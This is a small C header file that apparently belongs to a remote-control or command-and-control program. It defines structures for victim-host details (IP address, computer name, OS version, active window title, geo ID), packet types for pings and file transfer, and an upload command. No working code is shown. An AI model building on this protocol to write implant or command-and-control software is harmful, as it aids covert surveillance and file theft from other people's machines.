//
// Created by LUNAFE on 2022-02-04.
//

#ifndef TIANANMEN_STRUCTURE_H
#define TIANANMEN_STRUCTURE_H

struct INFO {
    char ip_address[32];
    char computer_name[64];
    char os_version[32];
    char window_title[256];
    char geo_id[16];
};

enum PACKET_TYPE {
    PING,
    INFO,
    FILE_SERVER_TO_CLIENT,
    FILE_DATA
};

struct PACKET {
    enum PACKET_TYPE type;
    char task_id[16];
    char data[1024];
    int current_index;
    int final_index;
};

enum COMMAND_TYPE {
    NONE,
    FILE_UPLOAD
};

struct COMMAND {
    enum COMMAND_TYPE type;
    wchar_t data[512];
};

#endif //TIANANMEN_STRUCTURE_H
